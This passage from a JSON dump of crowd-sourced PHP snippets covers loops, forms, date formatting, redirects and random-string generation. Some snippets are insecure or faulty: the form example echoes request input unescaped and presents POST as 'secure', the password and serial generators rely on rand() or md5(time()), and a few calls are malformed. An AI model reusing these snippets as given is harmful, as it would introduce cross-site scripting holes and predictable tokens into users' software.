    "description": "<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor($i=0;$i<count($fruits);$i++){     echo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     }   ?>\n <?php /* example 1 */  for ($i = 1; $i <= 10; $i++) {     echo $i; }  /* example 2 */  for ($i = 1; ; $i++) {     if ($i > 10) {         break;     }     echo $i; }  /* example 3 */  $i = 1; for (; ; ) {     if ($i > 10) {         break;     }     echo $i;     $i++; }  /* example 4 */  for ($i = 1, $j = 0; $i <= 10; $j += $i, print $i, $i++); ?>  \n/* For loop in php */  <?php for ($i = 0; $i < 10; $i++) {      echo $i.\"<br>\"; }  ?>\nforeach (array as $value){    //code to be executed;    print(\"value : $value\"); }   foreach (array as  $key => $value){    //code to be executed;    print(\"key[$key] => $value\"); } \nfor($i = 0; $i <=10; $i++){ \techo \"The index is $i\"; }\n<?php      for ($i = 1; $i <= 10; $i++) {     echo $i;   }\n",
    "reg_date": "2021-10-12T10:18:12.000Z"
  },
  {
    "id": 3561,
    "keyword": null,
    "link": null,
    "title": " php for array key value",
    "description": "<?php $array = array(1=>\"apple\",2=>\"Orange\",3=>\"Banana\");  foreach($array as $key => $value){ \techo \"The value for \" . $key . \" is \" . $value; } /*The value for 1 is apple The value for 2 is Orange The value for 3 is Banana  $array = [1 => \"apple\", 2 => \"Orange\", 3 => \"Banana\"         Is also valid ];*/   ?>\n$arr = array( \t'key1' => 'val', \t'key2' => 'another', \t'another' => 'more stuff'  ); foreach ($arr as $key => $val){ \t//do stuff }  //or alt syntax foreach ($arr as $key => $val) :    //do stuff here as well endforeach; \n",
    "reg_date": "2021-10-12T10:18:12.000Z"
  },
  {
    "id": 3562,
    "keyword": null,
    "link": null,
    "title": " php for break",
    "description": "<?php for ($x = 0; $x < 10; $x++) {   if ($x == 4) {     break;   } } ?> \n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3563,
    "keyword": null,
    "link": null,
    "title": " php for each schleife",
    "description": "foreach ($name as $key => $value) {     echo (\"Position {$key} enth&auml;lt {$value}. \"); }\n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3564,
    "keyword": null,
    "link": null,
    "title": " php for loop",
    "description": "<?php \t$fruits = [\"apple\", \"banana\", \"orange\"]; \tfor($i=0;$i<count($fruits);$i++){     echo \"Index of \".$i.\"= \".$fruits[$i].\"<br>\";     }   ?>\n <?php /* example 1 */  for ($i = 1; $i <= 10; $i++) {     echo $i; }  /* example 2 */  for ($i = 1; ; $i++) {     if ($i > 10) {         break;     }     echo $i; }  /* example 3 */  $i = 1; for (; ; ) {     if ($i > 10) {         break;     }     echo $i;     $i++; }  /* example 4 */  for ($i = 1, $j = 0; $i <= 10; $j += $i, print $i, $i++); ?>  \n/* For loop in php */  <?php for ($i = 0; $i < 10; $i++) {      echo $i.\"<br>\"; }  ?>\nfor($i = 0; $i <=10; $i++){ \techo \"The index is $i\"; }\n<?php      for ($i = 1; $i <= 10; $i++) {     echo $i;   }\nfor($i = 1; $i > 10; $i++){   //show i value \techo \"Your Number Is :$i\"; }\n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3565,
    "keyword": null,
    "link": null,
    "title": " php forbidden header",
    "description": "header('HTTP/1.0 403 Forbidden');\n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3566,
    "keyword": null,
    "link": null,
    "title": " php force download csv",
    "description": "  header('Content-Type: text/csv');   header('Content-Disposition: attachment; filename=\"ramais.csv\"');    $saida = $stmt->fetchAll(PDO::FETCH_ASSOC);   echo \"id;nome;ramal;email;setor;diretor\\r\\n\";   foreach ($saida as $s){   \tforeach ($s as $k => $v){   \t\techo \"{$v};\"; \t  } \t  echo \"\\r\\n\";   }\n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3567,
    "keyword": null,
    "link": null,
    "title": " php force image refresh",
    "description": "<img src=\"imagename.png?r=<?echo(rand());?>\"> //produces a random number in url\n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3568,
    "keyword": null,
    "link": null,
    "title": " php force to ssl",
    "description": "if($_SERVER[\"HTTPS\"] != \"on\") {     header(\"Location: https://\" . $_SERVER[\"HTTP_HOST\"] . $_SERVER[\"REQUEST_URI\"]);     exit(); }\n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3569,
    "keyword": null,
    "link": null,
    "title": " php foreac",
    "description": "foreach (array as $value){    //code to be executed;    print(\"value : $value\"); }   foreach (array as  $key => $value){    //code to be executed;    print(\"key[$key] => $value\"); } \nforeach (array_expression as $value)     statement foreach (array_expression as $key => $value)     statement \n<?php $arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; } // $arr is now array(2, 4, 6, 8) unset($value); // break the reference with the last element ?>\n <?php foreach (array(1, 2, 3, 4) as &$value) {     $value = $value * 2; } ?>  \n <?php $array = [     [1, 2],     [3, 4], ];  foreach ($array as list($a, $b)) {     // $a contains the first element of the nested array,     // and $b contains the second element.     echo \"A: $a; B: $b\\n\"; } ?>  \n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3570,
    "keyword": null,
    "link": null,
    "title": " php foreach",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\n$arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }\n<?php $food = array('burger','pizza','golgappa','momoes'); foreach($food as $value) {     echo $value,\"<br>\"; } ?>\n<?php $arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }  $dict = array(\"key1\"=>\"35\", \"key2\"=>\"37\", \"key3\"=>\"43\");  foreach($dict as $key => $val) {   echo \"$key = $val<br>\"; } ?>\n<?php $age = array(\"Peter\"=>\"35\", \"Ben\"=>\"37\", \"Joe\"=>\"43\");  foreach($age as $x => $val) {   echo \"$x = $val<br>\"; } ?>\n  <?php $age = array(\"Peter\"=>\"35\", \"Ben\"=>\"37\", \"Joe\"=>\"43\");    foreach($age as $x => $val) {   echo \"$x = $val<br>\"; } ?>  \n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3571,
    "keyword": null,
    "link": null,
    "title": " php foreach alternative syntax",
    "description": "<?php foreach ($collection as $item): ?>     <p>Do something in HTML with <?php echo $item; ?></p> <?php endforeach; ?>\n",
    "reg_date": "2021-10-12T10:18:13.000Z"
  },
  {
    "id": 3572,
    "keyword": null,
    "link": null,
    "title": " php foreach array",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\n$arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; }\n$arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }\n$arr = array(1, 2, 3); foreach ($arr as $key => $value) {     echo \"{$key} => {$value} \"; }\n<?php $age = array(\"Peter\"=>\"35\", \"Ben\"=>\"37\", \"Joe\"=>\"43\");  foreach($age as $x => $val) {   echo \"$x = $val<br>\"; } ?>\n$arr = array( \t'key1' => 'val', \t'key2' => 'another', \t'another' => 'more stuff'  ); foreach ($arr as $key => $val){ \t//do stuff }  //or alt syntax foreach ($arr as $key => $val) :    //do stuff here as well endforeach;\n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3573,
    "keyword": null,
    "link": null,
    "title": " php foreach associative array",
    "description": "$arr = array(   'key1' => 'val1',   'key2' => 'val2',   'key3' => 'val3' );  foreach ($arr as $key => $val) {   echo \"$key => $val\" . PHP_EOL; }\n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3574,
    "keyword": null,
    "link": null,
    "title": " php foreach continue",
    "description": "$stack = array('first', 'second', 'third', 'fourth', 'fifth');  foreach($stack as $v){     if($v == 'second') {       continue;     }     echo $v.'<br>'; } /* first third fourth fifth */ \n<?php for($i=0;$i<10;$i++) {     if($i==3)     {         continue;   //it will break one iteration.     }     echo $i; } ?>\n$basket = ['apples', 'bananas', 'broccoli', 'peaches', 'pears'];  foreach ($basket as $fruit) {   if ($fruit === 'broccoli') {     continue; // Skips 'broccoli' and moves onto 'peaches'   }      echo sprintf('I love %s!', $fruit); }  // I love apples! // I love bananas! // I love peaches! // I love pears!\nfor ($i = 0; $i < 10; ++$i)  {   echo \"I will loop 10 times\"; }\n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3575,
    "keyword": null,
    "link": null,
    "title": " php foreach count rows",
    "description": "<?php  $count = 0;  foreach( $names as $name){  $count = $count + 1;  echo  \"<td>\".$count. \"</td>        \"<td>\".$name. \"</td>\"; }  echo $count;  ?> \n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3576,
    "keyword": null,
    "link": null,
    "title": " php foreach echo key value",
    "description": "foreach($page as $key => $value) {   echo \"$key is at $value\"; }\n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3577,
    "keyword": null,
    "link": null,
    "title": " php foreach first element",
    "description": "foreach($array as $key => $element) {     if ($key === array_key_first($array))         echo 'FIRST ELEMENT!';      if ($key === array_key_last($array))         echo 'LAST ELEMENT!'; } \n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3578,
    "keyword": null,
    "link": null,
    "title": " php foreach get current index",
    "description": "$index = 0; foreach($data as $key=>$val) {     // Use $key as an index, or...      // ... manage the index this way..     echo \"Index is $index\\n\";     $index++; }\nforeach($array as $key=>$value) {     // do stuff } \n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3579,
    "keyword": null,
    "link": null,
    "title": " php foreach if last item",
    "description": "$numItems = count($arr); $i = 0; foreach($arr as $key=>$value) {   if(++$i === $numItems) {     echo \"last index!\";   } }    \n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3580,
    "keyword": null,
    "link": null,
    "title": " php foreach index",
    "description": "$index = 0; foreach($data as $key=>$val) {     // Use $key as an index, or...      // ... manage the index this way..     echo \"Index is $index\\n\";     $index++; }\nforeach($array as $key=>$value) {     // do stuff } \nBlog::whereYear('created_at', 2017)->get(); \n$array = array('a', 'b', 'c'); foreach ($array as $letter=>$index) {    echo $letter; //Here $letter content is the actual index   echo $array[$letter]; // echoes the array value  }//foreach  \n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3581,
    "keyword": null,
    "link": null,
    "title": " php foreach mysql result",
    "description": "$result_select = mysqli_query($cnx,$query_select); $rows = array(); while($row = mysqli_fetch_array($cnx,$result_select))     $rows[] = $row; foreach($rows as $row){      $ename = stripslashes($row['name']);     $eemail = stripcslashes($row['email']);     $epost = stripslashes($row['post']);     $eid = $row['id']; }\n",
    "reg_date": "2021-10-12T10:18:14.000Z"
  },
  {
    "id": 3582,
    "keyword": null,
    "link": null,
    "title": " php foreach random",
    "description": "shuffle($umm); foreach($umm as $new){     echo '<img src=\"'.$new->picture.'\" width=\"100\" />';     echo $new->id; } \n",
    "reg_date": "2021-10-12T10:18:15.000Z"
  },
  {
    "id": 3583,
    "keyword": null,
    "link": null,
    "title": " php foreach reverse",
    "description": "foreach(array_reverse($array) as $var) { \techo $var // Will show in reversed order }\n",
    "reg_date": "2021-10-12T10:18:15.000Z"
  },
  {
    "id": 3584,
    "keyword": null,
    "link": null,
    "title": " php foreach string char",
    "description": "//Split int char array $chars = str_split($str);  //Loop each char foreach($chars as $char) {     // your code }\n",
    "reg_date": "2021-10-12T10:18:15.000Z"
  },
  {
    "id": 3585,
    "keyword": null,
    "link": null,
    "title": " php foreach string in array",
    "description": "foreach($array as $item) {     echo $item['filename'];     echo $item['filepath'];      // to know what's in $item     echo '<pre>'; var_dump($item); }\n",
    "reg_date": "2021-10-12T10:18:15.000Z"
  },
  {
    "id": 3586,
    "keyword": null,
    "link": null,
    "title": " php form",
    "description": "/* POST */ <?php /* Receiving form Varibles $_POST */ if(isset($_POST)) {   echo(\"Name : \".$_POST[\"name\"].\"<br>E-mail :\".$_POST[\"email\"].\"<br><br>\"); } ?>        <!-- POST -->    <html> <body>  <form action=\"<?php echo $_SERVER['PHP_SELF']; ?>\" method=\"POST\"> Name: <input type=\"text\" name=\"name\"><br> E-mail: <input type=\"text\" name=\"email\"><br> <input type=\"submit\"> </form>   </body> </html> /* GET */ <?php /* Receiving form Varibles $_GET */ if(isset($_GET)) {   echo(\"Name : \".$_GET[\"name\"].\"<br>E-mail :\".$_GET[\"email\"].\"<br><br>\"); } ?>        <!-- GET -->    <html> <body>  <form action=\"<?php echo $_SERVER['PHP_SELF']; ?>\" method=\"GET\"> Name: <input type=\"text\" name=\"name\"><br> E-mail: <input type=\"text\" name=\"email\"><br> <input type=\"submit\"> </form>   </body> </html> <!-- POST is the secure way of using forms ! -->\n<?php  $errors=['email'=>'','title'=>'','ingredients'=>'']; $email=$title=$ingridients='';  if(isset($_POST['submit'])){     if(empty($_POST['email'])){         $errors['email']= 'email is empty <br>';     }else{         $email = $_POST['email'];         if(!filter_var($email, FILTER_VALIDATE_EMAIL)){             $errors['email']= 'email is not valid <br>';         }     }     if(empty($_POST['title'])){         $errors['title']= 'title is empty <br>';     }else{         $title = $_POST['title'];         if(!preg_match('/^[a-zA-Z\\s]+$/',$title)){             $errors['title']='title is not valid <br>';         }     }     if(empty($_POST['ingredients'])){         $errors['ingredients']= 'ingredients are empty';     }else{         $ingridients = $_POST['ingredients'];         if(!preg_match('/^([a-zA-Z\\s]+)(,\\s*[a-zA-Z\\s]*)*$/',$ingridients)){             $errors['ingredients']= 'invalid type <br>';          }     }     if(array_filter($errors)){         echo 'there is/are an error/s';     }else{         header('Location: ../index.php');     } }    ?>       <!DOCTYPE html> <html> \t \t<?php include('../template/header.php'); ?>  \t<section class=\"container grey-text\"> \t\t<h4 class=\"center\">Add a Pizza</h4> \t\t<form class=\"white\" action=\"add2.php\" method=\"POST\"> \t\t\t<label>Your Email</label> \t\t\t<input type=\"text\" name=\"email\" value=\"<?php echo htmlspecialchars($email); ?>\">             <div class=\"red-text\"><?php echo $errors['email']; ?></div> \t\t\t<label>Pizza Title</label> \t\t\t<input type=\"text\" name=\"title\" value=\"<?php echo htmlspecialchars($title); ?>\" >             <div class=\"red-text\"><?php echo $errors['title']; ?></div> \t\t\t<label>Ingredients (comma separated)</label> \t\t\t<input type=\"text\" name=\"ingredients\" value=\"<?php echo htmlspecialchars($ingridients); ?>\">             <div class=\"red-text\"><?php echo $errors['ingredients']; ?></div> \t\t\t<div class=\"center\"> \t\t\t\t<input type=\"submit\" name=\"submit\" value=\"Submit\"  class=\"btn brand z-depth-0\"> \t\t\t</div> \t\t</form> \t</section>  \t<?php include('../template/footer.php'); ?>  </html>\n",
    "reg_date": "2021-10-12T10:18:15.000Z"
  },
  {
    "id": 3587,
    "keyword": null,
    "link": null,
    "title": " php format date",
    "description": "<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n$today = date(\"F j, Y, g:i a\");               // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                       // 03.10.01 $today = date(\"j, n, Y\");                     // 10, 3, 2001 $today = date(\"Ymd\");                         // 20010310 $today = date('h-i-s, j-m-y, it is w Day');   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.'); // it is the 10th day. $today = date(\"D M j G:i:s T Y\");             // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');   // 17:03:18 m is month $today = date(\"H:i:s\");                       // 17:16:18 $today = date(\"Y-m-d H:i:s\");                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n<?php   // To change the format of an existing date   $old_date_format = \"20/03/1999\";   $new_data_format = date(\"Y-m-d H:i:s\", strtotime($old_date_format));\n<?php   \t$date = '05/05/2021'; \techo DateTime::createFromFormat(\"d/m/Y\", $date)->format('Y-m-d'); \t//2021-05-05 \n$originalDate = \"2017-03-08\"; $newDate = date(\"d/m/Y\", strtotime($originalDate)); \n<?php echo date(\"F j, Y, g:i a\").\"<br>\";               // March 10, 2001, 5:16 pm echo date(\"m.d.y\").\"<br>\";                       // 03.10.01 echo date(\"j, n, Y\").\"<br>\";                     // 10, 3, 2001 echo date(\"Ymd\").\"<br>\";                         // 20010310 echo date('h-i-s, j-m-y, it is w Day').\"<br>\";   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 echo date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.').\"<br>\"; // it is the 10th day. echo date(\"D M j G:i:s T Y\").\"<br>\";             // Sat Mar 10 17:16:18 MST 2001 echo date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h').\"<br>\";   // 17:03:18 m is month echo date(\"H:i:s\").\"<br>\";                       // 17:16:18 echo date(\"Y-m-d H:i:s\").\"<br>\";                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n",
    "reg_date": "2021-10-12T10:18:15.000Z"
  },
  {
    "id": 3588,
    "keyword": null,
    "link": null,
    "title": " php format int to 9 digits with preceding zeroes",
    "description": "str_pad($input, 9, \"0\", STR_PAD_LEFT);\n",
    "reg_date": "2021-10-12T10:18:15.000Z"
  },
  {
    "id": 3589,
    "keyword": null,
    "link": null,
    "title": " php forward to url",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php /* \tThis will redirect  to facebook.com */ $url = \"https://facebook.com.com\"; header(\"Location: $url\");   exit; ?>\nheader(\"Location: http://example.com/myOtherPage.php\"); die();\n//Write this in the Controller when working on Laravel.  header('Location: http://www.example.com/'); exit; \nheader(\"Location: http://example.com/redirect_page.php\"); die(); //Force the script to quit, or you would raise an error...\n",
    "reg_date": "2021-10-12T10:18:15.000Z"
  },
  {
    "id": 3590,
    "keyword": null,
    "link": null,
    "title": " php fpm config file location",
    "description": "#general config (change version number) /etc/php/7.2/fpm/php-fpm.conf   #pool config (change version number) /etc/php/7.2/fpm/pool.d/www.conf\n",
    "reg_date": "2021-10-12T10:18:16.000Z"
  },
  {
    "id": 3591,
    "keyword": null,
    "link": null,
    "title": " php full day name",
    "description": "date(\"l\",time()) // LOWER CASE L \n$mydate = '2016-01-01'; echo date('l, F jS, Y', strtotime($mydate)); # Friday, January 1st, 2016 \n",
    "reg_date": "2021-10-12T10:18:16.000Z"
  },
  {
    "id": 3592,
    "keyword": null,
    "link": null,
    "title": " php full form",
    "description": "PHP originally stood for Personal Home Page, but it now stands for the recursive initialism PHP: Hypertext Preprocessor.\nPHP is an acronym for \"PHP: Hypertext Preprocessor\" PHP is a widely-used, open source scripting language. PHP scripts are executed on the server.\n",
    "reg_date": "2021-10-12T10:18:16.000Z"
  },
  {
    "id": 3593,
    "keyword": null,
    "link": null,
    "title": " php function comment",
    "description": "// This is a single-line comment  # This is also a single-line comment  /* This is a multiple-lines comment block that spans over multiple lines */\n/**  * Does something interesting  *  * @param Place   $where  Where something interesting takes place  * @param integer $repeat How many times something interesting should happen  *   * @throws Some_Exception_Class If something interesting cannot happen  * @author Monkey Coder <mcoder@facebook.com>  * @return Status  */  \n<?php // This is a single-line comment  # This is also a single-line comment    /* This is a multiple-lines comment block that spans over multiple lines */    // You can also use comments to leave out parts of a code line $x = 5 /* + 15 */ + 5; echo $x; ?>\n/**  * This function compiles a message that tells you how great coffee is  *  * @param string  $compliment A nice word to describe coffee   * @param integer $score      A score out of 10  */\n// single line comment /* multi line comment hello */\n//For a single line comment use //: //this is a comment too //for multi-line comments use /* and */: /* <--start of multi-line comment this is a comment  this is a comment too (end of multi-line comment)-->*/\n",
    "reg_date": "2021-10-12T10:18:16.000Z"
  },
  {
    "id": 3594,
    "keyword": null,
    "link": null,
    "title": " php function to convert string to camelcase",
    "description": "public static function camelCase($str, array $noStrip = []) {         // non-alpha and non-numeric characters become spaces         $str = preg_replace('/[^a-z0-9' . implode(\"\", $noStrip) . ']+/i', ' ', $str);         $str = trim($str);         // uppercase the first character of each word         $str = ucwords($str);         $str = str_replace(\" \", \"\", $str);         $str = lcfirst($str);          return $str; }\necho ucwords(\"hello world\"); \nfunction from_camel_case($input) {   $pattern = '!([A-Z][A-Z0-9]*(?=$|[A-Z][a-z0-9])|[A-Za-z][a-z0-9]+)!';   preg_match_all($pattern, $input, $matches);   $ret = $matches[0];   foreach ($ret as &$match) {     $match = $match == strtoupper($match) ?       \tstrtolower($match) :     \tlcfirst($match);   }   return implode('_', $ret); }  // Tests: foreach ([   'simpleTest' => 'simple_test',   'easy' => 'easy',   'HTML' => 'html',   'simpleXML' => 'simple_xml',   'PDFLoad' => 'pdf_load',   'startMIDDLELast' => 'start_middle_last',   'AString' => 'a_string',   'Some4Numbers234' => 'some4_numbers234',   'TEST123String' => 'test123_string', ] as $test => $result) {   $output = from_camel_case($test);   if ($output === $result) {     echo \"Pass: $test => $result\\n\";   } else {     echo \"Fail: $test => $result [$output]\\n\";   } } /* Pass: simpleTest => simple_test Pass: easy => easy Pass: HTML => html Pass: simpleXML => simple_xml Pass: PDFLoad => pdf_load Pass: startMIDDLELast => start_middle_last Pass: AString => a_string Pass: Some4Numbers234 => some4_numbers234 Pass: TEST123String => test123_string */\n",
    "reg_date": "2021-10-12T10:18:16.000Z"
  },
  {
    "id": 3595,
    "keyword": null,
    "link": null,
    "title": " php function to remove underscore",
    "description": "$original = 'lets_go_to_the_beach_today_my_friend';  $replace = str_replace('_', ' ', $original, $count);  echo $count; \nstr_replace($remove, $replace, $the_string)\n",
    "reg_date": "2021-10-12T10:18:16.000Z"
  },
  {
    "id": 3596,
    "keyword": null,
    "link": null,
    "title": " php function with undefined amount of params",
    "description": "function sum() {   \t// args looks like: array(1,2,3)     $args = func_get_args();       return array_sum($args); }  echo sum(1,2,3);   // prints 6\n",
    "reg_date": "2021-10-12T10:18:16.000Z"
  },
  {
    "id": 3597,
    "keyword": null,
    "link": null,
    "title": " php fwrite new line",
    "description": "$data = 'my data' . PHP_EOL . 'my data'; $fp = fopen('my_file', 'a'); fwrite($fp, $data); fclose($fp);\n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3598,
    "keyword": null,
    "link": null,
    "title": " php generate random alphanumeric string",
    "description": "<?php  // online code for creating alphanumeric in php  // this will generate 6 charactor, you can create as many just change the 6 from code $pass = substr(str_shuffle(\"0123456789abcdefghijklmnopqrstvwxyz\"), 0, 6); echo $pass;  //output : 17w2y8 ?>\nfunction generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3599,
    "keyword": null,
    "link": null,
    "title": " php generate random string fixed length",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3600,
    "keyword": null,
    "link": null,
    "title": " php generate random string of characters",
    "description": "function generateRandomString($length = 25) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; } //usage  $myRandomString = generateRandomString(5);\nfunction generateRandomString($length = 10) {     $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';     $charactersLength = strlen($characters);     $randomString = '';     for ($i = 0; $i < $length; $i++) {         $randomString .= $characters[rand(0, $charactersLength - 1)];     }     return $randomString; }  Output the random string with the call below:  // Echo the random string. // Optionally, you can give it a desired string length. echo generateRandomString();\nphpCopy<?php   echo \"Out1: \",substr(md5(time()), 0, 16),\"\\n\";   echo \"Out2: \",substr(sha1(time()), 0, 16),\"\\n\";   echo \"Out3: \",md5(time()),\"\\n\";   echo \"Out4: \",sha1(time()),\"\\n\";   ?> \n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3601,
    "keyword": null,
    "link": null,
    "title": " php generate serial number",
    "description": "function GenerateSerial() {   $chars = array(0,1,2,3,4,5,6,7,8,9,'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z');   $sn = '';   $max = count($chars)-1;   for($i=0;$i<20;$i++){    \t$sn .= (!($i % 5) && $i ? '-' : '').$chars[rand(0, $max)];   }   return $sn; }  $serial = GenerateSerial() ;  while (checkifSerialexist($dbh, $serial)) {    $serial = GenerateSerial() ; }  function checkifSerialexist ($dbh, $serial) {   $statement = $dbh->prepare(\"SELECT `id` FROM `table` WHERE `SN` = :existSN\");   $statement->bindParam(':existSN',  $serial, PDO::PARAM_STR);    $statement->execute();   $statement->setFetchMode(PDO::FETCH_ASSOC);   $result = $statement->fetchAll();    return (count($result) > 0);    }\n",
    "reg_date": "2021-10-12T10:18:17.000Z"
  },
  {
    "id": 3602,
    "keyword": null,
    "link": null,
    "title": " php get",
